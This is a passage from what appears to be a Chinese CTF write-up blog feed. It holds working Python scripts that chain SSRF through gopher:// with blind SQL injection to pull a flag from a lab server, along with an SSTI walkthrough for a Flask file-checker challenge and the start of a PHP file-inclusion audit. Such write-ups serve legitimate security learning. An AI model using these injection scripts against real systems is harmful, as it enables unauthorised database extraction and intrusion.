class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">126</span>):<br>    content = <span class="hljs-string">&quot;id=1 and (length(database())=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i)<br>    content = content.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;/**/&quot;</span>)<span class="hljs-comment">#SQL页面存在空格过滤用/**/绕过</span><br>    content_length = <span class="hljs-built_in">len</span>(content)<br>    data = \<span class="hljs-comment">#切记切记下面字符串每行左边要贴边，不然tab会被编码</span><br><span class="hljs-string">f&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;content_length&#125;</span></span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string"><span class="hljs-subst">&#123;content&#125;</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>    result = urllib.parse.quote(data)<br>    result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>    payload = <span class="hljs-string">&quot;gopher://127.0.0.1:80/_&quot;</span>+result<span class="hljs-comment">#用python直接传参只需要编码一次</span><br>    r = requests.post(url,data=&#123;<span class="hljs-string">&quot;url&quot;</span>:payload&#125;).text<br>    <span class="hljs-comment">#print(r)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;meow&quot;</span> <span class="hljs-keyword">in</span> r:<span class="hljs-comment">#如果sql返回为真，页面会显示&quot;meow meow~&quot;</span><br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#3</span><br></code></pre></td></tr></table></figure><p>输出3，得出数据库长度为3。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;http://192.168.150.1:43083/curl.php&quot;</span><br>database = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<span class="hljs-comment">#判断数据库名第i个字符的ascii码是否为j，是的话为真会返回&quot;meow&quot;</span><br>        content = content.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;/**/&quot;</span>)<span class="hljs-comment">#SQL页面存在空格过滤用/**/绕过</span><br>        content_length = <span class="hljs-built_in">len</span>(content)<br>        data = \<br><span class="hljs-string">f&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;content_length&#125;</span></span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string"><span class="hljs-subst">&#123;content&#125;</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>        result = urllib.parse.quote(data)<br>        result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>        payload = <span class="hljs-string">&quot;gopher://127.0.0.1:80/_&quot;</span>+result<br>        r = requests.post(url,data=&#123;<span class="hljs-string">&quot;url&quot;</span>:payload&#125;).text<br>        <span class="hljs-comment">#print(r)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;meow&quot;</span> <span class="hljs-keyword">in</span> r:<br>            database += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(database)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#r</span><br><span class="hljs-comment">#ru</span><br><span class="hljs-comment">#rua</span><br><span class="hljs-comment">#数据库名为rua</span><br></code></pre></td></tr></table></figure><p>同样，爆表名，因为可能存在多个表，所以使用<code>group_concat()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<br>        ...........<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#f</span><br><span class="hljs-comment">#fl</span><br><span class="hljs-comment">#fla</span><br><span class="hljs-comment">#flag</span><br><span class="hljs-comment">#flag,</span><br><span class="hljs-comment">#flag,m</span><br><span class="hljs-comment">#flag,me</span><br><span class="hljs-comment">#flag,mes</span><br><span class="hljs-comment">#flag,mess</span><br><span class="hljs-comment">#flag,messa</span><br><span class="hljs-comment">#flag,messag</span><br><span class="hljs-comment">#flag,message</span><br><span class="hljs-comment">#flag,messages</span><br></code></pre></td></tr></table></figure><p>盲猜flag在flag表里，爆字段名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;flag&#x27;),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<span class="hljs-comment">#爆字段名</span><br>        ...........<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#f</span><br><span class="hljs-comment">#fl</span><br><span class="hljs-comment">#fla</span><br><span class="hljs-comment">#flag</span><br></code></pre></td></tr></table></figure><p>已知信息：</p><p>数据库rua、表flag、字段flag，爆flag内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr((select group_concat(flag) from flag),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<span class="hljs-comment">#爆flag表内容</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SSRF/image-20230412103314980.png"></p><p>拿到flag，本题还可以用二分法优化算法，附上L1ao学长的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fuck</span>():<br>    url = <span class="hljs-string">&quot;http://192.168.150.1:43083/curl.php&quot;</span><br>    result=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1290</span>):<br>        head=<span class="hljs-number">32</span><br>        tail=<span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> head&lt;tail:<br>            mid=(head+tail)&gt;&gt;<span class="hljs-number">1</span><br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((seleCt(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;rua&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;flag&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((seLect(flag)from(rua.flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            <span class="hljs-built_in">id</span> = urllib.parse.quote(sqli)<br>            id_length = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">id</span>)+<span class="hljs-number">3</span><br>            payload = <span class="hljs-string">f&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;id_length&#125;</span></span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string">id=<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>            <span class="hljs-comment"># print(payload)</span><br>            tmp = urllib.parse.quote(payload)<br>            new = tmp.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>            res = <span class="hljs-string">&#x27;gopher://127.0.0.1:80/_&#x27;</span> + new<br>            dataa = &#123;<br>                <span class="hljs-string">&quot;url&quot;</span>:res<br>            &#125;<br>            r = requests.post(url=url,data=dataa)<br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;meow meow meow&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>                head=mid+<span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                tail=mid<br>        <span class="hljs-keyword">if</span> head !=<span class="hljs-number">32</span>:<br>            result+=<span class="hljs-built_in">chr</span>(head)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span>   <br>        <span class="hljs-built_in">print</span>(result)<br>fuck()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>常见漏洞</category>
      
      <category>Web漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>ssrf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSTI</title>
    <link href="/2023/02/09/ssti/"/>
    <url>/2023/02/09/ssti/</url>
    
    <content type="html"><![CDATA[<h2 id="2023FCTF热身赛filechecker-mini"><a href="#2023FCTF热身赛filechecker-mini" class="headerlink" title="2023FCTF热身赛filechecker_mini"></a>2023FCTF热身赛filechecker_mini</h2><p>打开题目，让我们上传一个文件：</p><p><img src="/2023/02/09/ssti/image-20230429032204160.png"></p><p>桌面上随便丢了个php文件进去提交看看会有啥情况：</p><p><img src="/2023/02/09/ssti/image-20230429032353870.png"></p><p>判断文件类型，(MIME绕过预定)</p><p>附件下载下来先看源码：</p><p>index.html：</p><p><img src="/2023/02/09/ssti/image-20230429030651913.png"></p><p>可以看出该网页使用模块渲染将result值渲染进index对应位置，那么就看下后端代码app.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, render_template_string<br><span class="hljs-keyword">from</span> waitress <span class="hljs-keyword">import</span> serve<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><br>app_dir = os.path.split(os.path.realpath(__file__))[<span class="hljs-number">0</span>]<br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;app_dir&#125;</span>/upload/&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>,result=<span class="hljs-string">&quot;ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿&quot;</span>)<br><br>        <span class="hljs-keyword">elif</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>            f = request.files[<span class="hljs-string">&#x27;file-upload&#x27;</span>]<br>            filepath = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], f.filename)<br><br>            <span class="hljs-keyword">if</span> os.path.exists(filepath) <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;..&quot;</span> <span class="hljs-keyword">in</span> filepath:<br>                <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, result=<span class="hljs-string">&quot;Don&#x27;t (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                f.save(filepath)<br>                file_check_res = subprocess.check_output(<br>                    [<span class="hljs-string">&quot;/bin/file&quot;</span>, <span class="hljs-string">&quot;-b&quot;</span>, filepath], <br>                    shell=<span class="hljs-literal">False</span>, <br>                    encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>,<br>                    timeout=<span class="hljs-number">1</span><br>                )<br>                os.remove(filepath)<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;empty&quot;</span> <span class="hljs-keyword">in</span> file_check_res <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;cannot open&quot;</span> <span class="hljs-keyword">in</span> file_check_res:<br>                    file_check_res=<span class="hljs-string">&quot;wafxixi ฅ•ω•ฅ ฅ•ω•ฅ ฅ•ω•ฅ&quot;</span><br>                <span class="hljs-keyword">return</span> render_template_string(file_check_res)<br><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, result=<span class="hljs-string">&#x27;Error ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    serve(app, host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">3000</span>, threads=<span class="hljs-number">1000</span>, cleanup_interval=<span class="hljs-number">30</span>)<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/ssti/image-20230429032742576.png"></p><p>上面大家都用<code>render_template()</code>就你爱用<code>render_template_string()</code>是吧（指指点点，一眼模板注入，那么我们就希望<code>file_check_res</code>里有我们能够执行的rce代码。<code>file_check_res</code>哪来的？倒退往上看。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">f.save(filepath)<br>file_check_res = subprocess.check_output(<br>[<span class="hljs-string">&quot;/bin/file&quot;</span>, <span class="hljs-string">&quot;-b&quot;</span>, filepath], <br>shell=<span class="hljs-literal">False</span>, <br>encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>,<br>imeout=<span class="hljs-number">1</span><br>)<br>os.remove(filepath)<br></code></pre></td></tr></table></figure><p>先保存filepath这样一个文件，<code>subprocess.check_output(command)</code>返回Linux命令行输出，然后再把filepath文件删除，那么这里的<code>file_check_res</code>就是<code>file -b &#123;filepath&#125;</code>的结果。往上看filepath其实就是将上传文件目录的绝对路径和该文件的文件名拼接起来来标定用户上传的这个文件在容器中的绝对位置。逻辑搞明白了，现在的重点就在于如何对一个文件使用<code>file -b</code> 命令后返回值中能回显我们所期望的值。动手操作下flie命令，发现其不会输出文件的内容只会输出其类型，</p><p><img src="/2023/02/09/ssti/image-20230429034451879.png"></p><p>代码中的-b参数作用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">-b 　#列出辨识结果时，不显示文件名称。<br></code></pre></td></tr></table></figure><p>所以在文件名上动手脚的想法也破灭了（悲。</p><p>卡住了，向大佬博客寻求帮助，去guthub查找file命令源码。第一个仓库点开。<img src="/2023/02/09/ssti/image-20230429191534591.png"></p><p>点开tests里面是各种针对该<code>file</code>命令的<a href="https://github.com/file/file/tree/master/tests">测试结果</a></p><p><img src="/2023/02/09/ssti/image-20230429191635511.png"></p><p>这8个分别分别是在文本中写入bash脚本的4种情况和对应的用<code>file</code>命令执行的输出结果，可以看出如果文本内容为<code>#!/usr/bin</code>开头的那么输出结果中会显示文本中的其他内容。</p><p><img src="/2023/02/09/ssti/image-20230429191927593.png"></p><p>本地做测试：创建一个文本文件修改内容如下</p><p><img src="/2023/02/09/ssti/image-20230429193849800.png"></p><p>测试结果如下：</p><p><img src="/2023/02/09/ssti/image-20230429193915755.png"></p><p>显而易见，输出可控，可以进行模板渲染。新建一个文本文件内容如下，上传文件</p><p><img src="/2023/02/09/ssti/image-20230429194117415.png"></p><p><img src="/2023/02/09/ssti/image-20230429194209528.png"></p><p>存在ssti漏洞，开始利用，调用os模块</p><p><img src="/2023/02/09/ssti/image-20230429195640928.png"></p><p><img src="/2023/02/09/ssti/image-20230429195803084.png"></p><p>调用popen()方法。</p><p><img src="/2023/02/09/ssti/image-20230429195958840.png"></p><p>上传文件，获取flag。</p>]]></content>
    
    
    <categories>
      
      <category>常见漏洞</category>
      
      <category>Web漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>ssti</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件包含</title>
    <link href="/2023/02/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2023/02/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h2 id="BUUCTF-WarmUp"><a href="#BUUCTF-WarmUp" class="headerlink" title="BUUCTF_ WarmUp"></a>BUUCTF_ WarmUp</h2><p>嗯。。一打开是一个滑稽脸直接一眼ctrl+u查看源代码，查找到注释提示source.php，进入source.php看到是php代码审计。</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230213015433704.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$page</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<br>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$page</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$page</span>);<br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$_page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$_page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; 